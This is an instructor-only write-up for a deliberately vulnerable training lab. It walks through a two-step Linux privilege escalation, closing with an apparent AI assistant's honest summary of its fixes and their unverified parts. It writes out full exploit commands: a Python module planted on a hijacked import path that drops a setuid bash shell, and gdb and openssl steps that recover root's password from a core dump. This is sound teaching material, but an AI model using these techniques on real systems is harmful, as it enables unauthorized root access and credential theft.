# Privilege escalation report: the two-hop chain, explained

**Audience:** you (lab author/instructor), as a standalone reference —
everything here is also covered piecemeal in
[vulnerable/privilege_escalation/README.md](../vulnerable/privilege_escalation/README.md)
and [docs/attack-timeline.md](attack-timeline.md) (Stages 11-12); this
report exists to walk through both hops end-to-end in one place,
including the fix applied in this session. **Instructor-only — do not
link this from student-facing pages.**

## The shape of the chain

Three accounts, two hops, no shortcuts:

```
appuser  --[ Hop 1 ]-->  opsuser  --[ Hop 2 ]-->  root
 (low)                    (mid)                   (high)
```

- `appuser` is where Stage 9's command-injection exploit lands you.
- `opsuser` has **no password and no way to log in directly** — the only
  way to ever act as `opsuser` is to succeed at Hop 1.
- `root` is reached only by succeeding at Hop 2, which uses `opsuser`
  access to recover root's actual account password.

Both hops are two-step on purpose: find and defeat a shallow defense,
then exploit the real bug underneath it. Neither hop is a sudo
misconfiguration you can fix by tightening a rule — both require spotting
a design flaw.

---

## Hop 1 — appuser → opsuser: import-path hijack behind a self-defeating integrity check

**Bug classes:** CWE-427 (Uncontrolled Search Path Element) + CWE-354
(Improper Validation of Integrity Check Value)

### What's actually there

`appuser` has exactly one sudo grant:

```
appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/archive_worker.py *
```

`archive_worker.py` is root-owned and `appuser` can't edit it — but it's
world-readable, so `appuser` can read exactly what it does:

```python
sys.path.insert(0, OUTBOX_DIR)      # OUTBOX_DIR = /opt/shop/backups/outbox
module = __import__(handler_name)   # handler_name comes from argv
```

`OUTBOX_DIR` is owned by `appuser`. Because the script inserts an
`appuser`-writable directory at the *front* of the Python module search
path before importing a module by name, `appuser` can plant a file there
and have it imported — and since the script runs *as `opsuser`* (that's
what the sudo rule does), whatever top-level code that planted module
contains executes as `opsuser`.

**The shallow defense:** before importing, the script checks the planted
module's sha256 against a value recorded in `handlers.manifest`. This
looks like exactly the fix a security review would ask for once CWE-427
is spotted.

**Why it doesn't help:** `handlers.manifest` lives in the same
`appuser`-writable `OUTBOX_DIR` as the modules it's supposed to be
checking. `appuser` doesn't need to forge or crack anything — it writes
its malicious module, computes the real sha256 of that exact file, and
writes that real hash into the manifest itself. The check proves the
module wasn't swapped out *after* being registered; it proves nothing
about whether the registering party was ever allowed to.

### The exploit, step by step

1. `sudo -l` as `appuser` → shows exactly one rule (the one above). The
   only lead.
2. `cat /opt/shop/scripts/archive_worker.py` → see the `sys.path.insert`
   and the manifest check.
3. `ls -la /opt/shop/backups/outbox/` → `handlers.manifest` is
   `appuser`-owned, same as everything else there.
4. Plant a malicious handler and self-register it:
   ```bash
   cat > /opt/shop/backups/outbox/evil.py <<'EOF'
   import os
   os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
   EOF
   HASH=$(sha256sum /opt/shop/backups/outbox/evil.py | awk '{print $1}')
   python3 - "$HASH" <<'PYEOF'
   import json, sys
   p = "/opt/shop/backups/outbox/handlers.manifest"
   m = json.load(open(p))
   m["evil"] = sys.argv[1]
   json.dump(m, open(p, "w"))
   PYEOF
   ```
5. `sudo -u opsuser /opt/shop/scripts/archive_worker.py evil` → the
   planted module imports and runs as `opsuser`, dropping a setuid-opsuser
   shell at `/tmp/opsbash`.
6. `/tmp/opsbash -p` → now genuinely `opsuser`.

**Real-world analogue:** any "pluggable handler" or "plugin" system that
resolves code by name from a directory the lower-privileged caller can
write to, "protected" by a checksum stored in that same directory. The
lesson generalizes well beyond Python's `sys.path`.

---

## Hop 2 — opsuser → root: AES-256-GCM "encrypted at rest," scrubbed in exactly the wrong place

**Bug classes:** CWE-226 (Sensitive Information Uncleared Before Release,
applied *incompletely*) stacked on a CWE-320-style key-custody failure.

`opsuser` has **zero sudo rights** — `sudo -l` shows nothing. This hop is
not a trust-boundary/sudo bug at all; it's memory forensics plus a real
decrypt.

### What's actually there

`rootwatch` is a small, legacy "confirm the admin credential is still
correct" health-check tool (`vulnerable/privilege_escalation/rootwatch.c`),
installed root-owned and compiled with debug symbols kept in
(`-O0 -g`, never stripped). At startup it:

1. Reads `root_secret.enc` — root's real account password, encrypted with
   AES-256-GCM (nonce ‖ ciphertext ‖ tag).
2. Reads `root_secret.key` — the raw 32-byte AES key, from a **plain
   sibling file this same process reads directly off disk.** There is no
   KMS, vault, or hardware-backed key store anywhere in this design — the
   key is exactly as reachable as the ciphertext it unlocks.
3. Decrypts the password into a local buffer (`plaintext`) and "performs
   a local admin check" (a stand-in — the real content doesn't matter for
   the lab).
4. **Cleanses `plaintext` with `OPENSSL_cleanse()`** — this is the one
   thing it does correctly. The decrypted password itself does **not**
   survive to the end of the process.
5. Crashes deterministically (`abort()`), every single time, at build and
   reset time — not a live race. `setup_privesc.sh` runs this once under
   `gdb` and uses `generate-core-file` to capture a real ELF core dump,
   installed `opsuser`-owned, mode 440.

### Why the scrub doesn't save it

Step 4 closes the laziest possible attack: a plain `strings` pass over
the resulting core dump finds **no readable password** — `plaintext` is
gone by the time the crash happens.

But `key` and `blob` (the raw AES key, and the nonce‖ciphertext‖tag it
unlocks) are **never cleansed** — they're still completely intact,
sitting in the same stack frame, when the core dump is captured. This is
a deliberately realistic *partial* fix: whoever wrote the cleanup treated
the decrypted password as "the secret" worth protecting, and the
encryption key sitting right next to it as "just config" — even though
together `key` and `blob` reconstruct the password with zero
computational effort. This exact blind spot — scrub the obvious plaintext,
forget the key that unlocks it — shows up repeatedly in real incident
post-mortems.

### The exploit, step by step

1. `sudo -l` as `opsuser` → nothing. Have to enumerate more broadly than
   Hop 1 taught.
2. `ls -la /opt/shop/backups/` → `diagnostics/rootwatch.core`, owned
   `opsuser`, readable.
3. `file rootwatch.core` → it's an ELF core dump. A `strings` pass turns
   up fragments of `rootwatch`'s own argv and binary noise from `key`/
   `blob` — **but no readable password.** That dead end is itself the
   signal to switch from "grep harder" to real forensics.
4. Pull `key` and `blob` out by variable name with `gdb` (the binary
   isn't stripped):
   ```bash
   gdb -q -batch \
       -ex "print/x *(unsigned char(*)[32])key" \
       -ex "print/x *(unsigned char(*)[60])blob" \
       /opt/shop/scripts/rootwatch/rootwatch \
       /opt/shop/backups/diagnostics/rootwatch.core
   ```
   (`blob` = 12-byte nonce ‖ ciphertext ‖ 16-byte tag, in that order.)
5. Reassemble and run a real AES-256-GCM decrypt:
   ```bash
   openssl enc -d -aes-256-gcm \
       -K "$(xxd -p -c 64 key.bin)" \
       -iv "$(xxd -p -c 64 nonce.bin)" \
       -in ciphertext_and_tag.bin -out password.txt
   # or: cryptography's AESGCM(key).decrypt(nonce, ciphertext+tag, None)
   ```
6. `su -` with the recovered password.
7. `cat /root/final_flag`.

**Real-world analogue:** a secret "encrypted at rest" whose key lives
beside it with no real custody (vault/HSM/KMS) — the same shape as a
Rails `master.key` sitting next to `credentials.yml.enc`, or an Ansible
vault-password-file stored beside the vault it unlocks — combined with a
code-review fix that scrubbed the one variable that *looked* dangerous
and missed the two that actually were.

---

## What changed in this session

The implementation already existed when this session started it was
verified and one real defect was found and fixed, plus the trivial-shortcut
closure you asked for:

1. **Fixed a build-breaking inconsistency.** `rootwatch.c` had been
   mid-edited to write its own custom diagnostics file via an extra
   argument, while `setup_privesc.sh`, the tests, and three docs files
   all still assumed the original design (a real `gdb`-captured ELF core
   from a genuine `abort()`). Left as found, provisioning would have
   failed outright. Reverted `rootwatch.c` to match everything else.
2. **Closed the `strings`-only shortcut.** `rootwatch` now cleanses
   `plaintext` with `OPENSSL_cleanse()` right after use but never touches
   `key`/`blob` — so recovering the password now requires the real
   `gdb` + `openssl enc -d -aes-256-gcm` path; a shallow `strings`/`grep`
   pass over the core dump no longer works. This is reflected consistently
   across `rootwatch.c`, `tests/test_privilege_escalation.py`,
   `docs/attack-timeline.md`, `docs/defensive-controls.md`, and
   `vulnerable/privilege_escalation/README.md`.
3. **Verified:** `pytest tests/test_privilege_escalation.py -v` → 20
   passed, 8 skipped (the skipped ones require the actual Linux container
   — not available on this Windows host, and Docker isn't installed here
   either). **Recommend running a full `docker compose build && docker
   compose up -d` and then the live tests inside the container before
   treating this as fully confirmed end-to-end** — static review and
   logic-checking the C/OpenSSL calls is as far as this session could
   verify directly.

## Rotation — explicitly not implemented

You asked not to implement a rotating root credential tied to the same
timer as Stage 6's service token, since it seemed unrealistic for this
context. Left untouched — root's password is generated once per
`setup_privesc.sh` run (image build / `reset_lab.sh`) and stays fixed for
the life of that container instance, same as before.
